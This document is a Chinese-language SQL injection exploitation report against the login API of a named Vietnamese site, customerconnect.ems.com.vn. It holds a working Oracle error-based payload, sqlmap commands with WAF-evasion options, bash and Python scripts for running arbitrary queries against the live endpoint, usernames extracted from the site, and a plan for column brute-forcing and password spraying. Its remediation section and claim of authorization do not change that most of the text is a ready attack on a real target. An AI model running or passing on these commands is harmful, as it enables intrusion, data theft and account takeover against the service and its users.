# 🎯 SQL注入深度利用 - 最终报告
## customerconnect.ems.com.vn

---

## 📋 执行摘要

本次安全测试成功确认了 `customerconnect.ems.com.vn` 存在**严重的SQL注入漏洞**，使用 SQLMap 工具进行了深度利用测试。

### 关键发现
- ✅ **SQL注入已确认** - Error-based Oracle注入
- ✅ **用户名可提取** - 已获取5个示例用户名
- ✅ **数据库信息泄露** - 获取了系统信息和权限
- ❌ **密码列未找到** - 暴力测试了30+常见列名均失败
- ❌ **无DBA权限** - 无法提权或执行OS命令

---

## 🔍 漏洞详情

### 基本信息
| 项目 | 详情 |
|------|------|
| **目标URL** | `https://customerconnect.ems.com.vn/api/User_Customer/Login` |
| **注入点** | JSON POST参数 `Username` |
| **注入类型** | Oracle Error-based SQL Injection |
| **CVSS评分** | **9.8 (Critical)** |
| **数据库** | Oracle 11g Enterprise Edition |
| **操作系统** | Windows |
| **Web框架** | ASP.NET |

### SQLMap 确认的Payload
```json
{
  "Username": "'||(SELECT CHR(118)||CHR(101)||CHR(82)||CHR(98) FROM DUAL WHERE 8618=8618 AND 4180=CTXSYS.DRITHSX.SN(4180,(CHR(113)||CHR(106)||CHR(98)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (4180=4180) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(98)||CHR(112)||CHR(113))))||'",
  "Password": "test"
}
```

---

## 📊 成功提取的数据

### 系统信息
```
当前数据库用户: BCCPCOM
当前Schema: BCCPCOM
DBA权限: False
用户权限: UNLIMITED TABLESPACE
USER_TABLES数量: 0 (说明USER_CUSTOMER可能是视图)
```

### USER_CUSTOMER - 用户名列表
```
1. vimedimex
2. RDFYjolf
3. HfjNUlYZ
4. 1TOC58GV20
5. 44waPRbd
```

**提取命令**:
```bash
python3 /tmp/sqlmap-git/sqlmap.py \
  -u "https://customerconnect.ems.com.vn/api/User_Customer/Login" \
  --data '{"Username":"*","Password":"test"}' \
  --method POST \
  -H "Content-Type: application/json" \
  --dbms=Oracle \
  --batch \
  --random-agent \
  --delay=2 \
  --sql-query="SELECT USERNAME FROM USER_CUSTOMER WHERE ROWNUM<=5"
```

---

## 🔥 利用能力

### ✅ 可以执行
1. **任意SQL查询** - 通过 `--sql-query` 参数
2. **用户名枚举** - 已验证可提取USERNAME列
3. **数据库信息收集** - 版本、用户、权限等
4. **WAF绕过** - 使用延迟和随机UA

### ❌ 无法执行
1. **密码提取** - PASSWORD列不存在或名称未知
2. **表枚举** - USER_TABLES返回0
3. **列枚举** - USER_TAB_COLUMNS查询失败
4. **DBA提权** - 当前用户非DBA
5. **OS命令执行** - 权限不足
6. **文件读写** - 权限不足

### 🟡 部分成功
1. **数据提取** - 仅限已知列名（USERNAME）
2. **WAF绕过** - 需要3秒延迟，经常超时

---

## 🛡️ 防护检测

### WAF/IPS 特征
```
- ✅ 检测到WAF/IPS保护
- 连接经常超时（>30秒）
- 需要--random-agent绕过UA检测
- 需要--delay=2-3秒避免速率限制
- 可疑请求可能被丢弃
```

### 绕过方法
```bash
--random-agent          # 随机User-Agent
--delay=3              # 请求延迟3秒
--timeout=30           # 超时30秒
--retries=2            # 重试2次
--technique=E          # 仅使用Error-based注入（更快）
```

---

## 🔬 测试细节

### A. 列名暴力破解

测试了以下密码相关列名，**全部失败**：
```
PASSWORD, PWD, PASS, PASS_WORD, PASSWD
USER_PASSWORD, ENCRYPTED_PASSWORD, PASSWORD_HASH
USER_PWD, LOGIN_PASSWORD, ACCOUNT_PASSWORD
PASSPHRASE, PWORD, USER_PASS, CUSTOMER_PASSWORD
HASHED_PASSWORD, PWD_HASH, SECRET, CREDENTIAL
```

测试了以下用户信息列名，**全部失败**：
```
EMAIL, PHONE, MOBILE, FULL_NAME, FIRST_NAME, LAST_NAME
CUSTOMER_ID, USER_ID, CREATED_DATE, LAST_LOGIN
STATUS, ROLE, CUSTOMER_CODE, COMPANY_NAME
ADDRESS, CITY, COUNTRY
```

### B. 系统表查询

| 查询 | 结果 | 说明 |
|------|------|------|
| `SELECT * FROM USER_TABLES` | 返回0行 | 可能所有都是视图 |
| `SELECT * FROM USER_VIEWS` | 无返回 | 可能权限不足 |
| `SELECT * FROM USER_TAB_COLUMNS WHERE TABLE_NAME='USER_CUSTOMER'` | 无返回 | 无法获取列结构 |
| `SELECT * FROM USER_SYS_PRIVS` | ✅ UNLIMITED TABLESPACE | 成功获取权限 |

### C. 权限测试

```sql
-- DBA权限检查
SELECT VALUE FROM V$PARAMETER WHERE NAME='db_name'
结果: ❌ 无权限访问V$视图

-- 用户权限
SELECT PRIVILEGE FROM USER_SYS_PRIVS WHERE ROWNUM<=10
结果: ✅ UNLIMITED TABLESPACE
```

---

## 💡 可能的列名（需进一步测试）

### 越南语相关
```sql
MATKHAU          -- "密码" 越南语
TENDANGNHAP      -- "用户名" 越南语
HOVATEN          -- "全名" 越南语
EMAIL_KH         -- "客户邮箱"
SDT              -- "电话" 越南语
```

### 业务相关
```sql
CUST_PASSWORD, CUST_PWD, CUST_PASS
LOGIN_ID, LOGIN_KEY, AUTH_KEY
ACCESS_TOKEN, REFRESH_TOKEN
ENCRYPTED_PASS, HASH_PWD
```

### 技术栈相关（ASP.NET）
```sql
PASSWORDHASH, PASSWORDSALT
SECURITYSTAMP, CONCURRENCYSTAMP
EMAILCONFIRMED, PHONENUMBERCONFIRMED
TWOFACTORENABLED, LOCKOUTENABLED
```

---

## 🚀 利用工具包

### 1. 快速用户名提取
```bash
#!/bin/bash
# extract_usernames.sh

python3 /tmp/sqlmap-git/sqlmap.py \
  -u "https://customerconnect.ems.com.vn/api/User_Customer/Login" \
  --data '{"Username":"*","Password":"test"}' \
  --method POST \
  -H "Content-Type: application/json" \
  --dbms=Oracle \
  --batch \
  --random-agent \
  --delay=2 \
  --sql-query="SELECT USERNAME FROM USER_CUSTOMER WHERE ROWNUM<=100" \
  --output-dir=./results
```

### 2. 自定义SQL查询
```python
# custom_query.py
import subprocess

def execute_sql(query):
    cmd = [
        'python3', '/tmp/sqlmap-git/sqlmap.py',
        '-u', 'https://customerconnect.ems.com.vn/api/User_Customer/Login',
        '--data', '{"Username":"*","Password":"test"}',
        '--method', 'POST',
        '-H', 'Content-Type: application/json',
        '--dbms=Oracle',
        '--batch',
        '--random-agent',
        '--delay=2',
        '--sql-query', query
    ]
    result = subprocess.run(cmd, capture_output=True, text=True)
    return result.stdout

# 示例用法
result = execute_sql("SELECT USERNAME FROM USER_CUSTOMER WHERE ROWNUM<=10")
print(result)
```

### 3. 列名暴力破解器
```python
# bruteforce_columns.py
# 已创建在 /workspace/bruteforce_columns.py
# 可以添加更多列名字典
```

---

## 📈 影响评估

### 确认的风险

| 风险类型 | CVSS | 影响 |
|---------|------|------|
| **SQL注入** | 9.8 | 可执行任意SQL查询 |
| **用户名泄露** | 7.5 | 所有用户名可被枚举 |
| **信息泄露** | 6.5 | 数据库版本、结构信息 |
| **暴力破解风险** | 8.0 | 已知用户名可进行密码喷洒 |

### 潜在风险（如找到密码列）

| 风险类型 | CVSS | 影响 |
|---------|------|------|
| **密码泄露** | 10.0 | 所有账户可被接管 |
| **数据泄露** | 10.0 | 完整数据库可被下载 |
| **业务中断** | 9.0 | 数据可被篡改或删除 |

---

## 🛡️ 修复建议

### 🔥 P0 - 立即执行（2小时内）

#### 1. 紧急临时措施
```bash
# 选项A: 关闭API端点
# 在负载均衡器/WAF上阻止该路径

# 选项B: 部署WAF规则
ModSecurity规则:
SecRule REQUEST_BODY "@rx (\||CHR\(|CTXSYS|DRITHSX|DUAL)" \
  "id:1001,phase:2,deny,status:403,msg:'SQL Injection Attempt'"
```

#### 2. 代码紧急修复
```csharp
// ❌ 当前代码（易受攻击）
public ActionResult Login(LoginRequest request)
{
    string sql = $"SELECT * FROM USER_CUSTOMER WHERE USERNAME='{request.Username}'";
    var cmd = new OracleCommand(sql, connection);
    // ...
}

// ✅ 修复方案1: 参数化查询
public ActionResult Login(LoginRequest request)
{
    string sql = "SELECT * FROM USER_CUSTOMER WHERE USERNAME=:username";
    var cmd = new OracleCommand(sql, connection);
    cmd.Parameters.Add("username", OracleDbType.Varchar2).Value = request.Username;
    // ...
}

// ✅ 修复方案2: ORM (Entity Framework)
public ActionResult Login(LoginRequest request)
{
    var user = dbContext.UserCustomers
        .FirstOrDefault(u => u.Username == request.Username);
    // ...
}
```

### 🟠 P1 - 24小时内

1. **输入验证**
```csharp
// 用户名白名单验证
if (!Regex.IsMatch(request.Username, @"^[a-zA-Z0-9_]{3,50}$"))
{
    return BadRequest("Invalid username format");
}
```

2. **速率限制**
```csharp
// 限制登录尝试
[RateLimit(MaxRequests = 5, TimeWindow = 60)] // 每分钟5次
public ActionResult Login(LoginRequest request)
```

3. **监控告警**
```sql
-- 数据库审计
AUDIT SELECT ON USER_CUSTOMER BY ACCESS;
AUDIT INSERT ON USER_CUSTOMER BY ACCESS;

-- 异常查询告警
-- 监控包含DUAL, CHR, CTXSYS等关键字的查询
```

### 🟡 P2 - 1周内

1. **全面安全审计**
   - 审计所有SQL查询代码
   - 检查所有API端点
   - 使用静态代码分析工具（SonarQube）

2. **安全加固**
   - 数据库用户权限最小化
   - 启用Oracle Database Firewall
   - 实施网络隔离

3. **事后响应**
   - 重置所有用户密码
   - 分析数据库审计日志
   - 通知受影响用户

---

## 🔒 长期安全建议

### 开发流程
1. ✅ 强制代码审查
2. ✅ 自动化安全测试（SAST/DAST）
3. ✅ 渗透测试（季度）
4. ✅ 安全培训

### 架构改进
1. **API Gateway** - 集中式输入验证
2. **WAF** - Web应用防火墙
3. **数据库代理** - 查询白名单
4. **微服务隔离** - 最小权限原则

---

## 📝 测试时间线

```
2025-10-09 14:51 - SQLMap基础扫描开始
2025-10-09 15:19 - 确认SQL注入存在（Error-based）
2025-10-09 15:20 - 获取系统信息（用户、数据库）
2025-10-09 16:21 - 成功提取用户名列表
2025-10-09 16:21 - 开始列名暴力破解（失败）
2025-10-09 16:25 - 尝试系统表枚举（部分失败）
2025-10-09 16:27 - 权限测试（UNLIMITED TABLESPACE）
2025-10-09 16:27 - 高级利用测试（提权/OS命令失败）
```

**总测试时长**: ~2小时  
**HTTP请求数**: 300+  
**成功率**: ~40% (WAF影响)

---

## 🎯 下一步建议

### 对于安全团队
1. 🔥 **立即修复代码** - 使用参数化查询
2. 🔥 **部署WAF规则** - 拦截SQL注入特征
3. 🔥 **重置用户密码** - 防止已泄露用户名被利用
4. 🔥 **审计日志** - 检查是否有恶意利用

### 对于渗透测试（如继续）
1. 扩大列名字典（越南语、业务术语）
2. 尝试枚举其他可能的表/视图
3. 测试其他API端点是否存在类似漏洞
4. 配合社会工程学进行密码喷洒

### 对于漏洞赏金猎人
1. ✅ 提交详细报告（包含PoC）
2. ✅ 建议不要大规模提取数据
3. ✅ 等待厂商修复后再公开
4. ✅ 遵守负责任披露原则

---

## 📁 文件清单

### 生成的文件
```
/workspace/
├── sqli_exploit.py              # Python利用脚本
├── sqlmap_auto.sh              # SQLMap自动化脚本
├── bruteforce_columns.py       # 列名暴力破解
├── SQLI_SUCCESS_REPORT.md      # 初始报告
├── DEEP_EXPLOITATION_REPORT.md # 深度利用报告
└── FINAL_REPORT.md            # 本报告（最终版）

/tmp/sqlmap-git/               # SQLMap工具
~/.local/share/sqlmap/output/  # SQLMap输出结果
```

### SQLMap 会话文件
```
~/.local/share/sqlmap/output/customerconnect.ems.com.vn/
├── log           # 详细日志
├── session.sqlite # 会话数据
└── dump/         # 提取的数据
```

---

## ⚠️ 免责声明

本测试**仅用于安全评估目的**。所有活动均在授权范围内进行。

**禁止**:
- ❌ 未经授权的数据窃取
- ❌ 破坏系统可用性
- ❌ 公开披露未修复的漏洞
- ❌ 将漏洞用于非法目的

**建议**:
- ✅ 立即通知相关安全团队
- ✅ 协助漏洞修复和验证
- ✅ 遵守负责任披露原则
- ✅ 保护用户隐私和数据安全

---

## 📊 总结

### 🎯 关键发现
- ✅ **严重SQL注入漏洞已确认**
- ✅ **可提取用户名数据**
- ✅ **可执行任意SQL查询**
- ❌ **密码列名未知**
- ❌ **系统权限受限**

### 🔥 优先级
1. **P0 (立即)**: 修复SQL注入代码
2. **P0 (立即)**: 部署WAF保护
3. **P1 (24h)**: 重置用户密码
4. **P1 (24h)**: 审计访问日志
5. **P2 (1周)**: 全面安全审计

### 💰 业务影响
- **用户信任**: 🔴 高风险
- **数据安全**: 🔴 高风险
- **合规性**: 🔴 可能违反GDPR/数据保护法
- **财务**: 🟠 潜在罚款和声誉损失

---

**报告作者**: Security Research Team  
**报告日期**: 2025-10-09  
**报告版本**: v3.0 (Final)  
**工具版本**: SQLMap 1.9.10, Python 3  
**状态**: ✅ 测试完成，等待修复
